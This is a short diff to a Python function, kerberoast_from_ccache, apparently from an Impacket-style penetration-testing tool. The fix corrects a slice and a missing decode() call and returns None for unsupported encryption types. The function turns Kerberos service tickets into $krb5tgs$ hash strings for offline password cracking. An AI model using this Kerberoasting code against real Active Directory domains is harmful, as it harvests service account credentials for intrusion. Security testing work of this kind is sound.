@@ -651,7 +651,7 @@ def kerberoast_from_ccache(decodedTGS, spn, username, domain):
             entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                 constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, domain, spn.replace(':', '~'),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode)
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
             entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                 constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, domain, spn.replace(':', '~'),
@@ -666,6 +666,7 @@ def kerberoast_from_ccache(decodedTGS, spn, username, domain):
             logging.debug('Skipping %s/%s due to incompatible e-type %d' % (
                 decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                 decodedTGS['ticket']['enc-part']['etype']))
+            return None
         return entry
     except Exception as e:
         raise
